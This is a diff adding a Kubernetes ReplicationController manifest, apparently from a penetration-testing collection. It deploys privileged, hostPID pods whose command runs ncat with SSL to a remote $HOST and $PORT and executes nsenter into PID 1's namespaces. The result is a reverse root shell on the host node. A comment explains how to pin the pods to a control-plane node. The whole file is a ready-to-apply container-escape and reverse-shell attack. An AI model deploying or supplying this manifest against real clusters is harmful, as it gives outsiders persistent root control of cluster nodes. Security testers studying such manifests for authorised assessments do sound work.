@@ -1,0 +1,27 @@
+apiVersion: v1
+kind: ReplicationController
+metadata:
+  name: priv-and-hostpid-revshell-replicationcontroller
+  labels:
+    app: pentest
+    type: replicationcontroller
+spec:
+  replicas: 2
+  selector:
+    app: pentest
+    type: replicationcontroller
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: replicationcontroller
+    spec:
+      hostPID: true
+      containers:
+      - name: priv-and-hostpid-revshell-replicationcontroller
+        image: raesene/ncat
+        securityContext:
+          privileged: true
+        command: [ "/usr/local/bin/ncat", "--ssl", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      
